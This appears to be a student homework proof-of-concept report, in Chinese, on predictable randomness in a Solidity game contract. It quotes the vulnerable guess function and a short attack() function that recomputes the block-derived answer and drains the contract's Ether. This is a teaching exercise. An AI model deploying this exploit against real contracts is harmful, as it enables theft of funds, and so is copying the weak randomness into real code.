## HW4 POC bad randomness Report

### 1. Description

solidity 智能合约有一些固定的鏈上訊息可以取得，加上智能合約有可組合性的特性

### 2. HW POC

- `Game.sol` 9 - 16 行
```solidity
    function guess(uint256 _guess, address _receiver) public {
        uint256 answer = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)));

        if (_guess == answer) {
            (bool sent,) = _receiver.call{value: address(this).balance}("");
            require(sent, "Failed to send Ether");
        }
    }
```
  answer 答案的組成為 `blockhash(block.number - 1), block.timestamp`，其中 `blockhash(block.number - 1)` 可以取得前一個區塊的 hash，而 `block.timestamp` 可以取得當前區塊的 timestamp，因此可以透過這兩個值來計算出答案，而且這個答案是可以被預測的。

- 因為區塊鏈可組合性，代表別的合約在正常情況下是可以被呼叫的，所以製作一個 Attack 合約去呼叫 `Game.sol` 的 `guess` 函數，並且傳入預測的答案，就可以獲得獎勵。
可由以下路徑查看 [Attack.sol](/w4/src/Attack.sol)

- 其中我們可以看到合約呼叫下  `block.number - 1`  `block.timestamp` 互相呼叫，直都是相同的
![image](/w4/images/result-1.png)

- 所以在 Attack.sol 做出相同的動作，就可以發現其狀況

```solidity
    function attack() public {
        uint256 answer = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)));
        game.guess(answer, msg.sender);
    }
```

